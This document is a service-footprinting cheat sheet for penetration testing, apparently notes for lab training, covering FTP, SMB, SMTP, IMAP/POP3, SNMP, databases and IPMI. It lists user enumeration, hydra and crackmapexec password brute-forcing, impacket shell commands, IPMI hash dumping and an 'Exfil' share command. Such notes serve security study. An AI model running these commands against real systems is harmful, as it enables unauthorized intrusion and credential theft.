
### FTP :
```bash
ftp <FQDN/IP>	    Interact with the FTP service on the target.
nc -nv <FQDN/IP> 21	Interact with the FTP service on the target.
telnet <FQDN/IP> 21	Interact with the FTP service on the target.
openssl s_client -connect <FQDN/IP>:21 -starttls ftp	Interact with the FTP service on the target using encrypted connection.

wget -m --no-passive ftp://anonymous:anonymous@<target>	Download all available files on the target FTP server.

#nmap
find / -type f -name ftp* 2>/dev/null | grep scripts
sudo nmap -sV -p21 -sC -A 10.129.14.136
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
```

### SMB:
```bash
using nmap:Invoke-FileFinder
nmap -p 139,445 <target>
nmap --script smb-os-discovery <target>
nmap --script smb-security-mode <target>
nmap --script smb-vuln-ms17-010 <target>
nmap --script smb-vuln* <target>
sudo nmap 10.129.14.128 -sV -sC -p139,445

using enum4linux:
enum4linux -a <target>
enum4linux -U <target>
enum4linux -G <target>
enum4linux -S <target>
enum4linux -P <target>
enum4linux -o <target>

using smbclient:
smbclient -L //<target> -N
smbclient -L //<target> -U <user>%<pass>
smbclient //<target>/<share> -N
smbclient //<target>/<share> -U <user>
smbclient -N -L \\\\10.129.42.253
smbclient //10.129.14.128/notes

using rpcclient:
rpcclient -U <user>%<pass> <target>
rpcclient <target> -U "" -c "enumdomusers"
rpcclient <target> -U "" -c "enumdomgroups"
rpcclient <target> -U "" -c "getdompwinfo"
rpcclient <target> -U "" -c "lookupnames <domain>"
rpcclient -U "" 10.129.14.128

for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done


srvinfo	        Server information.
enumdomains	    Enumerate all domains that are deployed in the network.
querydominfo	Provides domain, server, and user information of deployed domains.
netshareenumall	Enumerates all available shares.
netsharegetinfo <share>	Provides information about a specific share.
enumdomusers	Enumerates all domain users.
queryuser <RID>	Provides information about a specific user.
enumdomusers
queryuser 0x3e9
queryuser 0x3e8
querygroup 0x201





using crackmapexec:
crackmapexec smb <target> --shares -u '' -p ''
crackmapexec smb <target> --shares -u <user> -p <pass>
crackmapexec smb <target> --users -u <user> -p <pass>
crackmapexec smb <target> --groups -u <user> -p <pass>
crackmapexec smb <target> --vulns
crackmapexec smb <target> -u users.txt -p passwords.txt

using smbmap:
smbmap -H <target>
smbmap -H <target> -u <user> -p <pass>
smbmap -H <target> -R <share>

using hydra:
hydra -l <user> -P /path/to/passwordlist.txt smb://<target>
hydra -L users.txt -P passwords.txt smb://<target>


#try to get shell if $ADMIN having write permission for the user
impacket-psexec username@<ip address>
impacket-wmiexec username@<ip address>
impacket-smbclient -hashes:<NTLM hash> Administrator@<ip address>

#using samrdump
samrdump.py 10.129.14.128

#use smbget to download all files from smb recursively
smbget -R smb://10.10.10.100/Replication


#**Shows all shared resources (folders/printers) on a computer.**
net view \\127.0.0.1

#Creates a share called Exfil that points to the given folder
net share Exfil=C:\Users\user\Download\exfil

#Lists all shares on the system.
net share

#Shows active sessions (who’s connected to your shares).
net session

#Maps a shared folder to a drive letter (X:).
net use X: \\127.0.0.1\Exfil

#Shows all mapped drives and active share connections.
net use
```


### SMPT Server:
```bash
telnet 10.129.14.128 25
vrfy raj@mail.lab.ignite
vrfy admin@mail.ignite.lab


AUTH PLAIN	AUTH is a service extension used to authenticate the client.
HELO	    The client logs in with its computer name and thus starts the session.
MAIL FROM	The client names the email sender.
RCPT TO	    The client names the email recipient.
DATA	    The client initiates the transmission of the email.
RSET	    The client aborts the initiated transmission but keeps the connection between client and server.
VRFY	    The client checks if a mailbox is available for message transfer.
EXPN	    The client also checks if a mailbox is available for messaging with this command.
NOOP	    The client requests a response from the server to prevent disconnection due to time-out.
QUIT	    The client terminates the session.




sudo nmap 10.129.14.128 -sC -sV -p25
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v


#brute force smtp users
smtp-user-enum -M VRFY -U /root/Desktop/user.txt -t 192.168.1.107
 -M: mode Method to use for username guessing EXPN, VRFY or RCPT 

 -U: file File of usernames to check via SMTP service
 -t: host Server host running SMTP service
msfconsole -x "search smtp_enum; use 0; show options; set RHOSTS <ip>; run"

smtp-user-enum -M VRFY -U /home/somx/Footprinting-wordlist/footprinting-wordlist.txt -t 10.129.74.41

smtp-user-enum -M VRFY -U /root/Desktop/user.txt -t 192.168.1.107
 -M: mode Method to use for username guessing EXPN, VRFY or RCPT 

 -U: file File of usernames to check via SMTP service
 -t: host Server host running SMTP service

msfconsole -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS 192.168.1.107; set RPORT 25; set USER_FILE /root/Desktop/user.txt; exploit"

ismtp -h 192.168.1.107:25 -e /root/Desktop/email.txt


```

### IMAP/POP3
```bash
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

openssl s_client -connect 10.129.14.128:pop3s #having various command
USER username	Identifies the user.
PASS password	Authentication of the user using its password.
STAT	Requests the number of saved emails from the server.
LIST	Requests from the server the number and size of all emails.
RETR id	Requests the server to deliver the requested email by ID.
DELE id	Requests the server to delete the requested email by ID.
CAPA	Requests the server to display the server capabilities.
RSET	Requests the server to reset the transmitted information.
QUIT	Closes the connection with the POP3 server.



openssl s_client -connect 10.129.14.128:imaps #having various command
1 LOGIN username password	Users login.
1 LIST "" *	Lists all directories.
1 CREATE "INBOX"	Creates a mailbox with a specified name.
1 DELETE "INBOX"	Deletes a mailbox.
1 RENAME "ToRead" "Important"	Renames a mailbox.
1 LSUB "" *	Returns a subset of names from the set of names that the User has declared as being active or subscribed.
1 SELECT INBOX	Selects a mailbox so that messages in the mailbox can be accessed.
1 UNSELECT INBOX	Exits the selected mailbox.
1 FETCH <ID> all	Retrieves data associated with a message in the mailbox.
1 CLOSE	Removes all messages with the Deleted flag set.
1 LOGOUT	Closes the connection with the IMAP server.

#Dangerous setting
auth_debug	Enables all authentication debug logging.
auth_debug_passwords	This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.
auth_verbose	Logs unsuccessful authentication attempts and their reasons.
auth_verbose_passwords	Passwords used for authentication are logged and can also be truncated.
auth_anonymous_username	This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.
```

### SNMP :
```bash
#dangerous setting: 
rwuser noauth	Provides access to the full OID tree without authentication.
rwcommunity <community string> <IPv4 address>	Provides access to the full OID tree regardless of where the requests were sent from.
rwcommunity6 <community string> <IPv6 address>	Same access as with rwcommunity with the difference of using IPv6.


snmpwalk -v2c -c public 10.129.14.128

sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

sudo apt install braa
braa <community string>@<IP>:.1.3.6.*
braa public@10.129.14.128:.1.3.6.*


```

### Mysql:
```bash
sudo nmap 10.129.231.137 -sV -sC -p3306 --script mysql*
mysql -u root -h 10.129.14.132
mysql -u root -pP4SSw0rd -h 10.129.14.128


mysql -u <user> -p<password> -h <IP address>	Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.
show databases;	                         Show all databases.
use <database>;	                         Select one of the existing databases.
show tables;	                         Show all available tables in the selected database.
show columns from <table>;	             Show all columns in the selected table.
select * from <table>;	                 Show everything in the desired table.
select * from <table> where <column> = "<string>";	Search for needed string in the desired table.
```

### MSSQL:
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
 
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth 
```


### Oracle TNS :
```bash
./odat.py all -s <ip>
```

### IPMI :
```bash
 sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_version) > run



msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run


```
